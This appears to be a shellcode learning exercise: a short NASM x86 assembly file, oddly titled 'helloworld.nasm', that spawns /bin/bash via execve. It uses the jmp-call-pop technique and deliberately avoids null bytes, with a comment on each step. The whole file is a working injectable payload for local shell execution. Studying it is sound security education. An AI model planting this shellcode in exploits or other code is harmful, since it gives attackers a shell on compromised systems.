; helloworld.nasm
; Author: Timo Humphrey
;
; execve(const char *filename, char *const argv[], char *const envp[]);
; execve(/bin/bash,/bin/bash,NULLs)
; EAX = call to execve
; EBX = ADDR of MESSAGE (ESI)
; ECX = ADDR of BBBB	(ESI +10)
; EDX = ADDR of CCCC	(ESI +14)

global _start

section .text
_start:
	jmp call_shellcode

shellcode:

	pop esi				; ESI = ADDR of: /bin/bashABBBBCCCC
					;                000000000111111111
					;		 123456789012345678
					; A = Null Byte to signify END OF STRING.
					; BBBB = argv[] needs to contain the program string (/bin/bash).
					; CCCC = envp[] needs to contain NULLs.

	xor ebx, ebx			; make ebx equ all NULL (0x0)
	mov byte [esi +9], bl		; move bl (NULL) into ESI at position 10 (ESI +9)

	mov dword [esi +10], esi	; move addr of ESI into the BBBB section.
	mov dword [esi +14], ebx	; move 4 nulls into CCCC section.

	;mov eax, 0xb			; BAD!! compiler must pad with 0x00 (nulls).  Nulls in code = bad!
	xor eax, eax
	mov al, 0xb			; GOOD! No padding required!
	lea ebx, [esi]
	lea ecx, [esi +10]
	lea edx, [esi +14]
	int 0x80

call_shellcode:
	call shellcode			; CALL puts the next line on the stack (addr of message)
	message db "/bin/bashABBBBCCCC"
